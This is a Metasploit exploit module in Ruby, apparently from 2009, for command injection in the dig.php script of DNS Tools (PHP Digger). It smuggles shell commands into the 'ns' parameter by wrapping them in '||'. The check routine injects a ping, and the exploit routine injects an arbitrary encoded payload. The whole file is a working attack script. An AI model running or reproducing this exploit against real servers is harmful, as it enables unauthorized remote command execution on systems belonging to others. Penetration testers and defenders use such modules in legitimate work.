##
# dns_tools_remote_exec.rb: 2009 dougsko
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'DNS Tools (PHP Digger) Remote Command Execution',
			'Description'    => %q{
				Vulnerable code in dig.php.
                Execute commands via "ns" variable.Just use || before and after
                the command.
			},
			'Author'         => [ 'dougsko', 'SirGod' ],
			'License'        => BSD_LICENSE,
			'Version'        => '0.0.1',
			'References'     =>
				[
					['URL', 'http://www.milw0rm.com/exploits/8454'],
					['MIL', '8454'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 4000,
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Sep 01 2005',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('URI', [true, "The full URI path to dig.php", "/tools/dig.php"]),
				], self.class)
	end

	def check
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' => 
			{
				'ns' => "||" + "ping -c1 localhost" + "||",
                'host' => "google.com",
                'query_type' => "NS",
                'status' => "digging"
			},
            'encode' => true,
		}, 25)
		
		if (res and res.body.match(/PING/i))
			return Exploit::CheckCode::Vulnerable
		end
		
		return Exploit::CheckCode::Safe
	end
		
	def exploit
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' => 
			{
				'ns' => "||" + payload.encoded + "||",
                'host' => "google.com",
                'query_type' => "NS",
                'status' => "digging"
			},
            'encode' => true,
		}, 25)
		
		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
			print("")
		else
			print_status("No response from the server")
		end
	end
	
end
